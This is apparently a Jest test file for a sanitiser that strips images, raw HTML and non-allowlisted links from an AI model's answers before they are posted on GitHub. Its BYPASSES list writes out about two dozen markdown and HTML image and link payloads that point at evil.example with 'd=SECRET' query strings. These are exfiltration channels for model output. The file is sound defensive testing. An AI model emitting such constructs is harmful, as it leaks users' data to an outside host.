/**
 * LUM-1154 acceptance — the model's answer is posted on GitHub, where an
 * image (or anything else fetched on render) could carry data out in its
 * URL. Every image / link construct must come out inert: no image renders,
 * and a link renders only to an allowlisted host (github.com, uselumo.ai);
 * any other URL is left as plain text. Code stays code.
 *
 * `renders` is a small CommonMark-ish oracle for the dangerous constructs:
 * an image `![…](…)` / `![…][…]` whose `!` is still syntax, a reference
 * definition, a link to a non-allowlisted host, or a raw HTML tag.
 */
import {
  CHAT_ANSWER_MAX_CHARS,
  cleanChatAnswer,
} from '@/ee/security/security-scan/pr-chat'

const EVIL = 'evil.example'

/** Prose of a posted answer: fenced code blocks dropped (they render as code). */
function proseOf(md: string): string {
  const out: string[] = []
  let fence: { ch: string; len: number } | null = null
  for (const line of md.split('\n')) {
    if (fence) {
      if (new RegExp(`^${fence.ch}{${fence.len},}\\s*$`).test(line))
        fence = null
      continue
    }
    const m = /^(`{3,}|~{3,})(.*)$/.exec(line)
    if (m && !(m[1]![0] === '`' && m[2]!.includes('`'))) {
      fence = { ch: m[1]![0]!, len: m[1]!.length }
      continue
    }
    out.push(line)
  }
  return out.join('\n')
}

function dangerous(md: string): string[] {
  const prose = proseOf(md)
  const hits: string[] = []
  // An image: `!` (not an entity, not backslash-escaped) right before `[`.
  if (/(^|[^\\])!\[/.test(prose)) hits.push('image')
  // A reference definition (`[label]:` with a literal colon).
  if (/\]:/.test(prose)) hits.push('reference definition')
  // A raw HTML tag.
  if (/<\/?[A-Za-z]/.test(prose)) hits.push('html tag')
  // An inline link whose destination is not on an allowlisted host.
  for (const m of prose.matchAll(/\]\(\s*<?([^)\s>]*)/g)) {
    const dest = m[1] ?? ''
    if (
      !/^https:\/\/(?:[a-z0-9-]+\.)*(?:github\.com|uselumo\.ai)(?:[/?#]|$)/i.test(
        dest
      )
    )
      hits.push(`link to ${dest}`)
  }
  return hits
}

const BYPASSES: Array<[string, string]> = [
  ['inline image', `Look: ![x](https://${EVIL}/p.png?d=SECRET)`],
  [
    'reference-style image',
    `Look: ![x][ref]\n\n[ref]: https://${EVIL}/p.png?d=SECRET`,
  ],
  [
    'collapsed reference image',
    `Look: ![ref][]\n\n[ref]: https://${EVIL}/p.png`,
  ],
  ['shortcut reference image', `Look: ![ref]\n\n[ref]: https://${EVIL}/p.png`],
  [
    'indented reference definition',
    `![a][r]\n\n   [r]: https://${EVIL}/x "title"`,
  ],
  [
    'reference definition in a blockquote',
    `> ![a][r]\n>\n> [r]: https://${EVIL}/x`,
  ],
  ['nested brackets', `![a [b] c](https://${EVIL}/p.png)`],
  ['nested image in link', `[![a](https://${EVIL}/i.png)](https://${EVIL}/)`],
  ['angle-bracket destination', `![a](<https://${EVIL}/p q.png>)`],
  ['image with title', `![a](https://${EVIL}/p.png "t")`],
  [
    'image in a table',
    `| a | b |\n|---|---|\n| ![x](https://${EVIL}/t.png) | y |`,
  ],
  [
    'image in a list',
    `- one\n- ![x](https://${EVIL}/l.png)\n  - ![y][r]\n\n[r]: https://${EVIL}/r`,
  ],
  ['html img', `<img src="https://${EVIL}/i.png">`],
  [
    'html picture/source srcset',
    `<picture><source srcset="https://${EVIL}/s.png"><img src="x"></picture>`,
  ],
  ['html img uppercase', `<IMG SRC=https://${EVIL}/i.png>`],
  ['html video poster', `<video poster="https://${EVIL}/v.png"></video>`],
  ['autolink in an image', `![<https://${EVIL}/a.png>](https://${EVIL}/a.png)`],
  ['link to a non-allowlisted host', `[docs](https://${EVIL}/?d=SECRET)`],
  ['link with lookalike host', `[x](https://github.com.${EVIL}/a)`],
  [
    'fake fence (backtick in info string) hiding an image',
    '```js`x\n![x](https://' + EVIL + '/f.png)\n```',
  ],
  [
    'indented fence hiding an image',
    '  ```\n![x](https://' + EVIL + '/f.png)\n  ```',
  ],
  [
    'unbalanced inline code hiding an image',
    // No closing run of two, no second single: every backtick is literal,
    // so markdown renders the image — the sanitiser must not take it as code.
    'a `` x ` ![i](https://' + EVIL + '/c.png)',
  ],
  ['escaped backslash before image', `\\\\![x](https://${EVIL}/b.png)`],
]

describe('answer sanitisation neutralises image / link exfiltration', () => {
  it.each(BYPASSES)('%s', (_name, raw) => {
    const out = cleanChatAnswer(raw)
    expect(out).not.toBeNull()
    expect(dangerous(out!)).toEqual([])
  })

  it('a real code block is left as code, images inside it included', () => {
    const raw =
      'Fix:\n```rust\nlet v = vec![1, 2];\nlet img = "![x](https://evil.example/c.png)";\n```\nDone.'
    const out = cleanChatAnswer(raw)!
    expect(out).toContain('let v = vec![1, 2];')
    expect(out).toContain('"![x](https://evil.example/c.png)"')
  })

  it('inline code is left as code', () => {
    expect(cleanChatAnswer('Use `vec![0; n]` and `Map<K, V>`.')).toBe(
      'Use `vec![0; n]` and `Map<K, V>`.'
    )
  })

  it('links to github.com / uselumo.ai stay links', () => {
    const out = cleanChatAnswer(
      'See [the docs](https://docs.github.com/en/x) and [Lumo](https://www.uselumo.ai/docs).'
    )!
    expect(out).toContain('[the docs](https://docs.github.com/en/x)')
    expect(out).toContain('[Lumo](https://www.uselumo.ai/docs)')
  })

  it('a URL that is not allowlisted survives as plain text', () => {
    const out = cleanChatAnswer('[docs](https://example.com/a)')!
    expect(out).toContain('https://example.com/a')
    expect(dangerous(out)).toEqual([])
  })

  it('generics in prose still read as generics', () => {
    expect(cleanChatAnswer('Returns Map<string, number>.')).toBe(
      'Returns Map&lt;string, number>.'
    )
  })

  it('rendered-diagram fences (mermaid, geojson, …) become plain code', () => {
    const out = cleanChatAnswer(
      '```mermaid\ngraph TD; A-->B; click A "https://evil.example"\n```'
    )!
    expect(out.startsWith('```text\n')).toBe(true)
  })
})

describe('code fences are always balanced', () => {
  it('an unclosed fence is closed even without a length cut', () => {
    const out = cleanChatAnswer('Try:\n```ts\nconst a = 1')!
    expect(out.endsWith('\n```')).toBe(true)
  })
  it('a longer fence is closed with the same length', () => {
    expect(cleanChatAnswer('````md\n```\ninner\n```')!.endsWith('\n````')).toBe(
      true
    )
  })
  it('a cut inside a fence is closed and stays under the cap', () => {
    const out = cleanChatAnswer(`See:\n~~~\n${'x'.repeat(10_000)}`)!
    expect(out.endsWith('\n~~~')).toBe(true)
    expect(out.length).toBeLessThanOrEqual(CHAT_ANSWER_MAX_CHARS)
  })
})
